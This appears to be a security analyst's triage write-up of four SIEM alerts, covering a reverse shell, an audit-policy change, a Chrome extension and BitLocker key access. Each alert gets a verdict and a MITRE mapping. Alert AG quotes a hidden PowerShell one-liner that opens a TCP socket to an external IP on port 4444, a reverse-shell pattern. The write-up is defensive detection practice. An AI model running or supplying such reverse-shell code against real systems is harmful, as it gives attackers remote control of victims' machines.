# Investigation — Case 018 (Phase 3: Rapid-Response Judgment)

**Methodology note:** This case was triaged from ticket data alone, without live command reproduction or Splunk verification, to test first-instinct accuracy under time-constrained conditions closer to real queue pressure.

---

## Prioritization Decision (Before Investigation)

**Chosen order: AG → AJ → AH → AI**

**Justification:**
- **Alert AG first** — reverse-shell socket code represents an active, in-progress C2 connection; the most severe and time-critical item regardless of label ties.
- **Alert AJ second** — a defense-evasion action affecting future logging capability across the host; checked immediately after the active-connection alert.
- **Alert AH third** — a browser extension install carries broad but lower-immediate-impact risk; appropriately placed after the two high-severity items.
- **Alert AI last** — sensitive but often explainable by mundane causes (lockout, IT support); correctly triaged last without being dismissed outright.

---

## Alert AG — PowerShell Reverse-Shell Socket Code

**Ticket Data:**
```
powershell.exe -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('194.31.98.14',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)}"
```

**Findings:**
- 🔴 This is a textbook reverse-shell/C2 socket pattern: establishing a raw TCP connection to a specific external IP:port (194.31.98.14:4444 — note port 4444 recurs from Case_012's Alert R, reinforcing its association with backdoor/Metasploit tooling) and reading incoming data in a continuous loop.
- 🔴 `-w hidden` suppresses the visible window, an evasion-adjacent flag consistent with prior cases.
- 🔴 No legitimate everyday PowerShell use case resembles this pattern — it is definitionally C2 beaconing/backdoor code.

**Verdict: 🔴 TP — T1059.001, T1071 (Application Layer Protocol / C2), T1219-adjacent (Remote Access Software behavior)**

---

## Alert AJ — Audit Policy Subcategory Force-Disable

**Ticket Data:**
```
Local security policy modified — "Audit: Force audit policy subcategory settings" set to Disabled
```

**Findings:**
- 🔴 This setting controls whether detailed audit subcategory settings (the specific event types logged, e.g., account management, logon events) take precedence over broader legacy audit categories. Disabling it can cause a host to silently revert to coarser, less detailed logging — directly reducing future investigative visibility.
- 🔴 No legitimate everyday reason exists for a standard user to modify this setting — this is a system-hardening/audit configuration control, not something touched during normal use.
- **Correction during investigation:** This alert was initially misjudged as Ambiguous. On review, this is functionally equivalent in severity and reasoning to Case_011's Alert G (Defender disable) and Case_013's Alert M (ScriptBlock logging disable) — both correctly called TP on command content alone without requiring further context. The same standard applies here: no genuine dual-use interpretation exists for disabling this specific audit control.

**Verdict: 🔴 TP — T1562 (Impair Defenses)**

---

## Alert AH — New Chrome Extension Installed

**Ticket Data:**
```
New Chrome extension installed — "AdBlock Ultra Pro"
Source: Chrome Web Store (official)
```

**Findings:**
- 🟢 Official Chrome Web Store is a legitimate, controlled distribution source (Google reviews submissions, though not perfectly). Ad-blocker extensions are among the most common, widely-used browser extension categories.
- 🟢 No aggravating factors present (no sideloaded/unknown source, no unusual permissions flagged, no other suspicious session activity referenced).

**Verdict: 🟢 FP**

---

## Alert AI — BitLocker Recovery Key Accessed

**Ticket Data:**
```
BitLocker recovery key accessed via Control Panel
Time: 11:45 AM
```

**Findings:**
- 🟡 A BitLocker recovery key can be used to decrypt a protected drive without the normal login credential — accessing it carries genuine sensitivity, whether the intent is legitimate (a locked-out user retrieving their own key, an IT support action) or malicious (preparing for offline data access to a drive).
- 🟡 **Correction during investigation:** This alert was initially misjudged as FP based on the access method (Control Panel, a standard system location) and unremarkable time (business hours) appearing "normal." Neither of these facts constitutes positive evidence of legitimate intent — the same standard applied incorrectly here as in Case_015's Alert V (USB device, "normal timing" mistaken for proof of safety). No baseline or corroborating context (e.g., a documented lockout event, an IT ticket) is available to confirm legitimacy.

**Verdict: 🟡 Ambiguous**

---

## Summary Table

| Alert | Verdict | MITRE | SIEM Label vs. Reality |
|---|---|---|---|
| AG — Reverse Shell | 🔴 TP | T1059.001, T1071 | High label matched reality |
| AJ — Audit Policy Disabled | 🔴 TP | T1562 | High label matched reality |
| AH — Chrome Extension | 🟢 FP | — | Medium label overestimated concern |
| AI — BitLocker Key Access | 🟡 Ambiguous | — | Low label underestimated the genuine evidentiary gap |
